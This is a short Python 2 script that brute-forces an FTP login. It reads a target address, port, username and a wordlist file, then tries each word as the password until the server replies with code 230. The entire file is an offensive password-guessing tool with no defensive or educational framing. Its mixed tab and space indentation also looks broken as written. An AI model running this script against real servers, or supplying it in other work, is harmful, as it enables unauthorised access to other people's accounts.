#! /usr/bin/python 

import socket

import re

import sys

def connect(username, password):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	print('[*] Username: %s\n[*] Password: %s' % (username, password))

	s.connect((address, port))

	data = s.recv(1024)
    
    	s.send('USER %s\r\n' % (username))
    	
    	data = s.recv(1024)
    
   	s.send('PASS %s\r\n' % (password))
    
    	data = s.recv (3)
    
    	s.send ('QUIT\r\n')
    
    	s.close()
    
    	return data

username = raw_input('Please enter a user name: ')

address = raw_input('Please enter an IP address: ')

port = raw_input('Please enter the port you wish to connect through: ')
port = int(port)

while True:

	try:
		fname = raw_input('Please enter a txt. file: ')
		handle = open(fname,'r')
		print("\n")
		break
	except:
		print("\n")
		print fname,'cannot be opened!'

text = handle.read()
words = text.split()

counts = dict()
for word in words:
	counts[word] = counts.get(word,0)+1


for password in counts:
    
    attempt = connect(username, password)
    
    if '230' in attempt:

	print('\n[*] Password Found: %s' % (password))

	quit()

    elif '530' in attempt:

	print ('[*] Login Incorrect\n\n')

    else:

	quit()


        
        
        
        